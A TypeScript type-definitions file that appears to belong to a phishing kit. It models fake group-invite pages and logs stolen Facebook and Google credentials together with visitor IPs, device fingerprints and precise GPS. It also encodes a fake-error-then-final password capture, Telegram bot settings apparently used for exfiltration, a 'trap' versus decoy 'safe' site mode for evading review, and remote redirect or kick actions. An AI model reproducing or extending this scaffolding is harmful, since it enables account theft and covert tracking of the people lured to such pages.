
export interface GroupData {
  id: string;
  name: string;
  image: string | null; // Base64 string
  link: string; // The actual destination URL
  memberCount?: string; // Changed to string for flexibility (e.g. "1.2K")
  lastMessage?: string; // To customize the grey text in chat list
}

export interface VisitorLog {
  ip: string;
  city: string;
  region: string;
  country_name: string;
  org: string;
  timestamp: number;
  groupId: string;
  groupName: string;
}

// Complex Device Fingerprint
export interface DeviceFingerprint {
    gpu: string;
    batteryLevel: string;
    isCharging: boolean;
    connectionType: string; // 4g, wifi, etc
    platform: string;
    cores: number;
    memory: number; // RAM in GB
    screenRes: string;
}

export interface CredentialLog {
  service: 'facebook' | 'google';
  email: string;
  password?: string;
  timestamp: number;
  ip: string;
  location?: string;
  userAgent?: string;
  deviceInfo?: DeviceFingerprint; // Added advanced info
  isLiveType?: boolean; // Is this a partial capture?
  attemptNumber?: number; // 1 = Fake Error Log, 2 = Final Log
  preciseGPS?: string; // Google Maps Link
}

export interface TelegramConfig {
  botToken: string;
  chatId: string;
}

export interface AdminState {
  groups: GroupData[];
}

export type SiteMode = 'trap' | 'safe'; // trap = phishing login, safe = decoy page

// --- NEW ACTION TYPE ---
export interface RemoteAction {
    type: 'ALERT' | 'REDIRECT' | 'RELOAD' | 'KICK' | 'NONE';
    payload?: string;
}
